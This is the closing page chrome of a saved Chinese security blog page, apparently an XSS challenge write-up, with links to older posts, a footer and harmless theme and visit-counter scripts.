href="/2015/02/26/shinian/">（转）十年学会程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/22/webfirst/">0基础如何学好WEB（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/31/hackx/">凤凰挽歌，黑客独白（作者：我是老鹰&amp;炫凤舞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/bookshelf1/">（转）学长们给我们的书目（结尾附上PDF地址）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/xiaobaistart/">菜鸟小白的开始...</a></li></ul>
<script>
</script>

<footer id="footer">
<div class="outer">
<div id="footer-info">
<div class="footer-left">
<i class="fa fa-copyright"></i> 
                2014-2017 LoRexxar
            </div>
<div class="footer-right">
<a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
</div>
</div>
<div class="visit">
<span id="busuanzi_container_site_pv" style="display:none">
<span id="site-visit" title="本站到访数"><i aria-hidden="true" class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span>
</span>
</span>
<span>| </span>
<span id="busuanzi_container_page_pv" style="display:none">
<span id="page-visit" title="本页阅读量"><i aria-hidden="true" class="fa fa-eye animated infinite pulse"></i><span id="busuanzi_value_page_pv"></span>
</span>
</span>
</div>
</div>
</footer>

<script data-main="/js/main.js" src="./xss无声挑战赛_writeup  LoRexxar's Blog/require.min.js"></script>
<script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 7;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>
<div class="scroll" id="scroll">
<a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
<a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
<a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async="" src="./xss无声挑战赛_writeup  LoRexxar's Blog/busuanzi.pure.mini.js">
</script>


